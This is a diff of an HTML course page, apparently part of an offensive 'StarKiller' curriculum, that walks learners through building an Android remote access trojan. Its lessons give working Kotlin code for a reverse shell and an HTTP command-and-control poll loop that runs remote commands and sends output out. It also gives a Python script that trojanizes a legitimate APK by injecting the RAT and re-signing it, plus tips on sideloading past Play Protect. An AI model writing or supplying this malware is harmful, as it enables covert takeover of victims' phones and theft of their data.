-          <p><code>arrayOf("sh", "-c", cmd)</code> — passes the command to the shell interpreter. Without <code>sh -c</code>, you'd need to split the command into binary + args yourself. With it, you get full shell features: pipes, redirects, and builtins.</p>
-          <p><code>proc.inputStream.bufferedReader().readText()</code> — reads all stdout. <code>errorStream</code> reads all stderr. Both needed — many Android commands write to stderr. Merge them like the PS1 <code>2>&amp;1</code> trick.</p>
-          <p>The <code>?: break</code> after <code>readLine()</code> — if readline returns null the socket closed. Clean exit.</p>
-          <p>In the real StarKiller, the command loop also handles <code>!upload &lt;path&gt;</code> and <code>!screenshot</code> prefixes to trigger binary exfil and screen capture over the same socket.</p>
-        </div>
-        <button class="btn-next" id="next-2" onclick="goLesson(3)">NEXT: HTTP C2 POLL →</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" onclick="goLesson(1)">← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(2)">SKIP →</button>
-      </div>
-    </div>
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write connectShell(). Thread wrapper, Socket connect, bufferedReader/Writer, "OK\n" beacon, while loop reading commands, Runtime.exec with sh -c, merge stdout+stderr, write back with flush, null-break on closed stream.</p>
+  <textarea class="code-editor" id="editor-2" spellcheck="false" placeholder="fun connectShell(ip: String, port: Int) {&#10;    Thread {&#10;        try {&#10;            val socket = java.net.Socket(ip, port)&#10;            // reader, writer, command loop...&#10;        } catch (e: Exception) { }&#10;    }.start()&#10;}"></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(2)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(2)">→ SKIP</button>
+  </div>
+  <div class="result-panel" id="result-2"></div>
+  <div class="explain-box" id="explain-2">
+    <h4>// WHY THIS WORKS</h4>
+    <p><code>arrayOf("sh", "-c", cmd)</code> delegates to the shell interpreter. Without it, <code>exec()</code> treats the first element as the binary name and subsequent elements as literal argv — pipes and redirects don't work. Android uses Toybox/Busybox for its shell, so <code>sh -c</code> enables standard shell semantics even on minimal environments.</p>
+  </div>
+  <div class="next-wrap" id="next-2">
+    <button class="btn btn-prev" onclick="goLesson(1)">← PREV</button>
+    <button class="btn btn-next" onclick="goLesson(3)">NEXT LESSON →</button>
+  </div>
+</div>
 
-    <div class="lesson" id="lesson-3">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 03 / 04</div>
-        <h2>HTTP C2 POLL LOOP</h2>
-        <div class="desc">The secondary channel. Instead of a persistent TCP connection, the RAT polls an HTTP endpoint for commands. More resilient — works on networks that drop long-lived TCP connections.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// HTTP vs TCP FOR C2</h3>
-        <p>TCP gives you a live interactive shell. But carrier networks aggressively kill idle TCP connections after minutes. If the operator doesn't send a command, the connection dies silently.</p>
-        <p>HTTP polling is resilient. The RAT wakes up every N seconds, GETs a command endpoint, executes whatever it finds, POSTs the output, sleeps. No persistent connection to kill.</p>
-        <p>The C2 server is just a Python HTTP server storing pending commands per device ID. The RAT registers with its device ID on first poll. The operator queues commands. The RAT picks them up on the next poll cycle.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write the Kotlin HTTP poll loop</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE:</div>
-          <pre>fun pollC2(c2Url: String, deviceId: String) {
+<!-- LESSON 3 -->
+<div class="lesson" id="lesson-3">
+  <div class="lesson-header">
+    <span class="lang-badge lang-kotlin">KOTLIN — HTTP CLIENT</span>
+    <div class="lesson-tag">// LESSON 03 / 04 — HTTP C2 POLL LOOP</div>
+    <h2>Dead Drop — Polling for Orders Instead of Staying on the Line</h2>
+    <p>Carrier networks aggressively kill idle TCP connections after minutes. The HTTP poll loop is the counter: instead of a persistent connection, the RAT wakes every 5 seconds, checks the dead drop (GET /cmd), executes whatever it finds, posts the result (POST /result), and goes back to sleep.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    A dead drop at a fixed location. The RAT visits every 5 seconds, checks for a note (GET /cmd?id=...). If there's a note, it executes the order and leaves the result at a second location (POST /result). <strong>No persistent connection to detect and kill. WAIT is the empty dead drop — "no orders, stand by." The device ID routes orders to the right asset. Connection timeout prevents indefinite hang on a dead server.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — HTTP + POLL PATTERN</h4>
+    <table>
+      <tr><td><code>HttpURLConnection</code></td><td>Android's built-in HTTP client from the java.net package. Requires INTERNET permission. Opened via <code>url.openConnection() as java.net.HttpURLConnection</code> — the cast is required because openConnection() returns URLConnection.</td></tr>
+      <tr><td><code>connectTimeout</code></td><td>Milliseconds before the connection attempt gives up. Without this, a dead C2 server hangs the thread indefinitely. 5000ms = 5 seconds max wait. Always set this on any network call in a loop.</td></tr>
+      <tr><td><code>conn.disconnect()</code></td><td>Explicitly closes the connection and releases the underlying socket. Without this, connections may be kept open by the connection pool, leaking sockets over time.</td></tr>
+      <tr><td><code>cmd != "WAIT"</code></td><td>The sentinel protocol. Server returns "WAIT" when no command is queued. Distinguishes "no orders" from "server error". Empty string means network/parse error; "WAIT" means connected and idle. Avoids executing an empty string as a shell command.</td></tr>
+      <tr><td><code>pc.doOutput = true</code></td><td>Enables writing a request body for POST. Must be set before writing to pc.outputStream. Without it, writing to outputStream throws an exception.</td></tr>
+      <tr><td><code>Thread.sleep(5000)</code></td><td>Pauses the current thread for 5000ms. Runs at the end of each poll cycle regardless of success or failure — even a failed request should back off before retrying. Static delay is simpler than exponential backoff for a RAT.</td></tr>
+      <tr><td>empty catch block</td><td><code>catch (e: Exception) { }</code> — swallows all exceptions silently. Network errors, server down, connection refused — none of these should crash the RAT. Sleep then retry is the entire error handling strategy.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>fun pollC2(c2Url: String, deviceId: String) {
     Thread {
         while (true) {
             try {
-                val url = java.net.URL("$c2Url/cmd?id=$deviceId")
+                val url = java.net.URL("$c2Url/cmd?id=$deviceId")  <span class="cm">// dead drop URL with device routing</span>
                 val conn = url.openConnection() as java.net.HttpURLConnection
                 conn.requestMethod = "GET"
-                conn.connectTimeout = 5000
+                conn.connectTimeout = 5000                           <span class="cm">// 5s max wait — dead server won't hang us</span>
                 val cmd = conn.inputStream.bufferedReader().readText().trim()
-                conn.disconnect()
-                if (cmd.isNotEmpty() && cmd != "WAIT") {
+                conn.disconnect()                                    <span class="cm">// release socket explicitly</span>
+                if (cmd.isNotEmpty() && cmd != "WAIT") {             <span class="cm">// WAIT = no orders; empty = error</span>
                     val proc = Runtime.getRuntime().exec(arrayOf("sh","-c",cmd))
                     val out = proc.inputStream.bufferedReader().readText()
                     val post = java.net.URL("$c2Url/result?id=$deviceId")
                     val pc = post.openConnection() as java.net.HttpURLConnection
                     pc.requestMethod = "POST"
-                    pc.doOutput = true
+                    pc.doOutput = true                               <span class="cm">// enable request body for POST</span>
                     pc.outputStream.write(out.toByteArray())
                     pc.disconnect()
                 }
-            } catch (e: Exception) { }
-            Thread.sleep(5000)
+            } catch (e: Exception) { }                             <span class="cm">// swallow all errors — sleep and retry</span>
+            Thread.sleep(5000)                                     <span class="cm">// 5s poll interval regardless of outcome</span>
         }
     }.start()
 }</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-3" placeholder="fun pollC2(c2Url: String, deviceId: String) {
-    Thread {
-        while (true) {
-            // GET command from /cmd?id=deviceId
-            // exec if not empty/WAIT
-            // POST result to /result?id=deviceId
-            // sleep 5000ms
-        }
-    }.start()
-}"></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(3)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(3)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-3"></div>
-        <div class="explain-box" id="explain-3">
-          <h3>// WHAT JUST HAPPENED</h3>
-          <p><code>conn.connectTimeout = 5000</code> — 5 second timeout. Without this, a dead C2 server hangs the thread indefinitely. Carrier networks also drop connections silently — the timeout is the safety valve.</p>
-          <p>The <code>WAIT</code> sentinel — when no command is queued, the server returns "WAIT" instead of empty string. This makes parsing unambiguous: empty means server error, "WAIT" means connected and idle.</p>
-          <p><code>try { ... } catch (e: Exception) { }</code> — swallow all errors silently. Network errors, connection refused, server down — none of these should crash the RAT. It just sleeps and retries.</p>
-          <p>The real StarKiller C2 uses HTTPS with a self-signed cert and <code>TrustManager</code> that accepts any cert — bypasses certificate validation entirely so the C2 doesn't need a valid SSL cert.</p>
-        </div>
-        <button class="btn-next" id="next-3" onclick="goLesson(4)">NEXT: APK BINDER →</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" onclick="goLesson(2)">← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(3)">SKIP →</button>
-      </div>
-    </div>
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write pollC2(). Thread wrapper, infinite loop, GET from /cmd?id=..., 5000ms timeout, disconnect, check cmd not empty and not WAIT, exec with sh -c, POST output to /result?id=..., empty catch, sleep 5000 at end.</p>
+  <textarea class="code-editor" id="editor-3" spellcheck="false" placeholder="fun pollC2(c2Url: String, deviceId: String) {&#10;    Thread {&#10;        while (true) {&#10;            try {&#10;                // GET command from /cmd?id=deviceId&#10;                // exec if not empty/WAIT&#10;                // POST result to /result?id=deviceId&#10;            } catch (e: Exception) { }&#10;            Thread.sleep(5000)&#10;        }&#10;    }.start()&#10;}"></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(3)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(3)">→ SKIP</button>
+  </div>
+  <div class="result-panel" id="result-3"></div>
+  <div class="explain-box" id="explain-3">
+    <h4>// WHY THIS WORKS</h4>
+    <p>HTTP is resilient because it has no connection state to maintain. Every request is independent — carrier NAT timeouts, VPN reconnects, and cell handoffs are all invisible to the polling loop. The RAT just misses a beat and resumes on the next 5-second tick. A persistent TCP shell would need reconnect logic. The poll loop has no connection to lose.</p>
+  </div>
+  <div class="next-wrap" id="next-3">
+    <button class="btn btn-prev" onclick="goLesson(2)">← PREV</button>
+    <button class="btn btn-next" onclick="goLesson(4)">NEXT LESSON →</button>
+  </div>
+</div>
 
-    <div class="lesson" id="lesson-4">
-      <div class="lesson-header">
-        <div class="lesson-num">LESSON 04 / 04</div>
-        <h2>APK BINDER — TROJANIZE A LEGIT APP</h2>
-        <div class="desc">Decompile a legitimate APK with apktool, inject the RAT's smali code, merge the manifests, recompile, re-sign. The result looks identical to the original. The RAT runs silently alongside it.</div>
-      </div>
-      <div class="concept-box">
-        <h3>// THE BINDER PIPELINE</h3>
-        <p>apktool decompiles an APK to smali (Android's assembly language) and a manifest. You add your smali classes. You merge your permissions into the manifest. You recompile. You sign with a debug key.</p>
-        <p>The injected code runs via a hook in the legitimate app's Application class — you modify the original's <code>Application.onCreate()</code> to also call your service's start. The user sees the legitimate app working normally. The RAT is running in the same process.</p>
-        <p>Detection: Google Play Protect detects re-signed APKs of known apps. Delivery is therefore via sideload (APK file), not Play Store.</p>
-      </div>
-      <div class="mission-box">
-        <h3>MISSION: Write the Python binder pipeline script</h3>
-        <div class="code-ref">
-          <div class="code-ref-label">// TARGET CODE:</div>
-          <pre>import subprocess, shutil, os
+<!-- LESSON 4 -->
+<div class="lesson" id="lesson-4">
+  <div class="lesson-header">
+    <span class="lang-badge lang-python">PYTHON 3 — TOOLING</span>
+    <div class="lesson-tag">// LESSON 04 / 04 — APK BINDER</div>
+    <h2>Trojanizing — Your Code Inside Their App</h2>
+    <p>Decompile a legitimate APK, inject the RAT's smali classes, merge the permissions, recompile, re-sign. The output APK looks and behaves exactly like the original. The RAT runs silently in the same process.</p>
+  </div>
+  <div class="metaphor">
+    <div class="meta-label">// FIELD ANALOGY</div>
+    You capture the enemy's supply package, add your intelligence sensor to it, reseal it, and send it on. The recipient gets the package they expected — food and fuel working normally. Your sensor activates in the background. <strong>apktool d = open the package. shutil.copytree smali = insert the sensor. inject_manifest_permissions = update the cargo manifest. apktool b = reseal. apksigner sign = slap the official stamp back on. Target receives the legitimate app, gets the RAT too.</strong>
+  </div>
+  <div class="nomenclature">
+    <h4>// NOMENCLATURE — APK STRUCTURE + TOOLS</h4>
+    <table>
+      <tr><td><code>apktool d</code></td><td>Decompile APK to smali (Android assembly) and resources. <code>--no-res</code> skips resource decompilation — resources aren't needed and recompiling them causes errors. <code>-f</code> force-overwrites if output dir exists.</td></tr>
+      <tr><td>smali</td><td>Android's assembly language. Dalvik/ART bytecode represented as text. Each class becomes a .smali file. <code>com/system/update/C2Service.smali</code> is your RAT service — copying this file makes the compiled APK include your class.</td></tr>
+      <tr><td><code>shutil.copytree</code></td><td>Recursively copies a directory tree. Copies all of the RAT's smali classes into the legitimate app's source tree. After this, apktool b compiles both the original and your injected classes together.</td></tr>
+      <tr><td><code>xml.etree.ElementTree</code></td><td>Python's stdlib XML parser. <code>ET.parse()</code> parses XML to a tree. <code>.getroot().findall('uses-permission')</code> finds all permission elements. <code>t_root.insert(0, perm)</code> injects them at the top of the target manifest.</td></tr>
+      <tr><td><code>apktool b</code></td><td>Recompile smali back to APK. <code>--use-aapt2</code> uses the modern asset packager — required for apps targeting Android 10+. Output is unsigned.</td></tr>
+      <tr><td><code>apksigner sign</code></td><td>Signs the APK with a keystore. Android requires a valid signature to install — the OS won't install unsigned APKs. The debug keystore ships with the Android SDK. Any valid signature works; only Play Store checks for the original developer key.</td></tr>
+      <tr><td><code>check=True</code></td><td>subprocess.run parameter: raises CalledProcessError if the command exits non-zero. Without it, apktool failures are silently ignored and you'd produce a corrupt APK with no error.</td></tr>
+    </table>
+  </div>
+  <div class="code-ref">
+    <div class="code-ref-label">// REFERENCE — annotated</div>
+    <pre>import subprocess, shutil, os
 
 def bind_apk(legit_apk, payload_apk, output_apk):
     subprocess.run(["apktool", "d", legit_apk, "-o", "legit_src",
-                    "--no-res", "-f"], check=True)
+                    "--no-res", "-f"], check=True)   <span class="cm"># decompile legit app (skip resources)</span>
     subprocess.run(["apktool", "d", payload_apk, "-o", "payload_src",
-                    "--no-res", "-f"], check=True)
-    smali_src = "payload_src/smali/com/system/update"
-    smali_dst = "legit_src/smali/com/system/update"
-    shutil.copytree(smali_src, smali_dst)
+                    "--no-res", "-f"], check=True)   <span class="cm"># decompile RAT APK</span>
+    smali_src = "payload_src/smali/com/system/update"  <span class="cm"># RAT's smali directory</span>
+    smali_dst = "legit_src/smali/com/system/update"    <span class="cm"># inject into legit source tree</span>
+    shutil.copytree(smali_src, smali_dst)              <span class="cm"># copy entire class tree</span>
     inject_manifest_permissions(
-        "legit_src/AndroidManifest.xml",
+        "legit_src/AndroidManifest.xml",               <span class="cm"># add RAT permissions to legit manifest</span>
         "payload_src/AndroidManifest.xml"
     )
     subprocess.run(["apktool", "b", "legit_src", "-o", "bound_unsigned.apk",
-                    "--use-aapt2"], check=True)
+                    "--use-aapt2"], check=True)        <span class="cm"># recompile: original + injected classes</span>
     subprocess.run(["apksigner", "sign",
                     "--ks", "debug.keystore",
                     "--ks-pass", "pass:android",
                     "--out", output_apk,
-                    "bound_unsigned.apk"], check=True)
+                    "bound_unsigned.apk"], check=True) <span class="cm"># sign — any valid keystore works</span>
     print(f"[+] Bound APK: {output_apk}")
 
 def inject_manifest_permissions(target_manifest, payload_manifest):
@@ -365,52 +379,36 @@ def inject_manifest_permissions(target_manifest, payload_manifest):
     target = ET.parse(target_manifest)
     payload = ET.parse(payload_manifest)
     t_root = target.getroot()
-    for perm in payload.getroot().findall('uses-permission'):
-        t_root.insert(0, perm)
+    for perm in payload.getroot().findall('uses-permission'):  <span class="cm"># copy each permission element</span>
+        t_root.insert(0, perm)                                  <span class="cm"># insert at top of manifest</span>
     target.write(target_manifest, xml_declaration=True, encoding='utf-8')</pre>
-        </div>
-      </div>
-      <div class="editor-area">
-        <div class="editor-label">// YOUR CODE:</div>
-        <textarea class="code-editor" id="editor-4" placeholder="import subprocess, shutil, os
-
-def bind_apk(legit_apk, payload_apk, output_apk):
-    # 1. Decompile both APKs with apktool
-    # 2. Copy smali classes from payload to legit
-    # 3. Inject permissions into legit manifest
-    # 4. Recompile and sign
-    ...
-
-def inject_manifest_permissions(target_manifest, payload_manifest):
-    # Parse both XMLs, copy uses-permission elements
-    ..."></textarea>
-        <div class="editor-controls">
-          <button class="btn-check" onclick="checkCode(4)">▶ CHECK CODE</button>
-          <button class="btn-skip" onclick="skipLesson(4)">→ SKIP</button>
-        </div>
-        <div class="result-panel" id="result-4"></div>
-        <div class="explain-box" id="explain-4">
-          <h3>// WHAT JUST HAPPENED — STARKILLER COMPLETE</h3>
-          <p><code>--no-res</code> — skip resource decompilation. Resources (images, layouts) don't need to be modified and recompiling them introduces errors. Skip unless you're changing UI.</p>
-          <p><code>shutil.copytree</code> — copies the entire smali directory tree. The payload's smali classes are now inside the legitimate app's source. When apktool recompiles, they get compiled in.</p>
-          <p><code>apksigner sign --ks debug.keystore</code> — signs with the Android debug key. Any keystore works — the signature just needs to be consistent for the OS to install it. The debug keystore ships with Android SDK.</p>
-          <p>The real StarKiller binder also hooks the Application subclass to call <code>C2Service.start()</code> from <code>onCreate</code>. Without this hook, the service never starts — smali classes alone don't run themselves.</p>
-        </div>
-        <button class="btn-next" id="next-4" onclick="showComplete()">🎯 COURSE COMPLETE</button>
-      </div>
-      <div class="lesson-nav-bar">
-        <button class="btn-prev" onclick="goLesson(3)">← PREV</button>
-        <button class="btn-skip" onclick="skipLesson(4)">SKIP →</button>
-      </div>
-    </div>
-
-    <div class="complete-screen" id="complete-screen">
-      <h2>// STARKILLER — COMPLETE</h2>
-      <p>Android manifest. Kotlin TCP shell. HTTP C2 poll loop. APK binder.<br>You just built an Android RAT from scratch.</p>
-      <p><a href="index.html">← Back to Catalog</a> &nbsp;|&nbsp; <a href="vader.html">Next: VADER Agent →</a></p>
-    </div>
-  </main>
+  </div>
+  <div class="task-label">// YOUR MISSION</div>
+  <p class="task-desc">Write bind_apk() (apktool d both APKs, copytree smali, inject_manifest_permissions, apktool b, apksigner sign, print output) and inject_manifest_permissions() (parse both XMLs, copy uses-permission elements into target, write back).</p>
+  <textarea class="code-editor" id="editor-4" spellcheck="false" placeholder="import subprocess, shutil, os&#10;&#10;def bind_apk(legit_apk, payload_apk, output_apk):&#10;    # decompile, copy smali, merge manifests, recompile, sign&#10;    ...&#10;&#10;def inject_manifest_permissions(target_manifest, payload_manifest):&#10;    # parse both XMLs, copy uses-permission, write&#10;    ..."></textarea>
+  <div class="btn-row">
+    <button class="btn btn-check" onclick="checkCode(4)">▶ CHECK CODE</button>
+    <button class="btn btn-skip" onclick="skipLesson(4)">→ SKIP</button>
+  </div>
+  <div class="result-panel" id="result-4"></div>
+  <div class="explain-box" id="explain-4">
+    <h4>// WHY THIS WORKS</h4>
+    <p>Google Play Protect detects re-signed known APKs via certificate pinning on popular apps. The binder targets sideloaded delivery — the user installs via APK file, not Play Store. Without the application class hook (modifying the legit app's Application.onCreate to start C2Service), the injected code never runs — the smali classes are compiled in but nothing calls them. The full StarKiller binder patches the Application class to call service start from onCreate.</p>
+  </div>
+  <div class="next-wrap" id="next-4">
+    <button class="btn btn-prev" onclick="goLesson(3)">← PREV</button>
+    <button class="btn btn-next" onclick="showComplete()">FINISH COURSE →</button>
+  </div>
 </div>
+
+<div class="complete-screen" id="complete-screen">
+  <h2>// STARKILLER — COMPLETE</h2>
+  <p>Android manifest. Kotlin TCP shell. HTTP C2 poll loop. APK binder.<br>Android RAT from declaration to delivery.</p>
+  <p><a href="index.html">← Back to Catalog</a> &nbsp;|&nbsp; <a href="vader.html">Next: VADER Agent →</a></p>
+</div>
+</main>
+</div>
+
 <script>
 const COURSE_KEY='22div_course_starkiller';const TOTAL=4;
 const EXPECTED={
